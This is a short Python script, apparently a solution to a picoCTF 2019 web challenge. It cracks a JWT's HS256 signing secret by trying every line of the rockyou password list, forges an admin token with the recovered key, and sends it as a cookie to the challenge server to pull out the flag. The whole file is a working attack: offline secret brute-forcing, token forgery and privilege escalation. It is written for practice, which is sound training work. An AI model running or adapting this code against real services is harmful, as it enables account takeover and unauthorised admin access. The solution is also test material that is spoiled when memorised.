import jwt
import requests
from bs4 import BeautifulSoup

f = open("rockyou.txt", "r", encoding="ISO-8859-1")
lines = f.read().split('\n')
b = bytes("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y", "utf-8")
key = ""
for i in range(len(lines)):
    line = lines[i]
    encoded = jwt.encode({'user': 'john'}, line, algorithm='HS256')
    if encoded == b:
        key=line
        break

token = str(jwt.encode({'user': 'admin'}, key, algorithm='HS256'), encoding="utf-8")

cookie={"admin": "True", "jwt": token}
r = requests.get("http://2019shell1.picoctf.com:45158/#", cookies=cookie)
soup = BeautifulSoup(r.text, 'html.parser')
flag = soup.textarea.text
# print(flag)
print(flag[flag.index("{")+1: len(flag)-1])

